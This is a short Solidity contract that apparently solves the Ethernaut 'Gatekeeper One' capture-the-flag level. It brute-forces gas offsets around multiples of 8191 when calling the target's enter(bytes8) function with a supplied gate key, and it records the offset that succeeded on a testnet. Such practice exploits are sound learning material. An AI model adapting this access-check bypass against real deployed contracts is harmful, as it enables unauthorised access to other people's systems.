// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract GatekeeperOneSolution {
    address public owner;
    address public gatekeeperOne;

    event GasOffset(uint);

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    constructor(address _gatekeeperOne) {
        owner = msg.sender;
        gatekeeperOne = _gatekeeperOne;
    }

    function makeEntrant(
        bytes8 _gateKey,
        uint multiplier
    ) public onlyOwner returns (uint) {
        bool success = false;
        uint offset;

        while ((!success) && (offset < 500)) {
            (success, ) = gatekeeperOne.call{gas: multiplier * 8191 + offset}(
                abi.encodeWithSignature("enter(bytes8)", _gateKey)
            );
            offset++;
        }

        /// @dev This is just for curiosity purpose. Wanted to know which was the actual offset on Sepolia.
        emit GasOffset(offset);

        /// @dev Returned value is easier to handle in testing environment.
        return offset;
    }
}
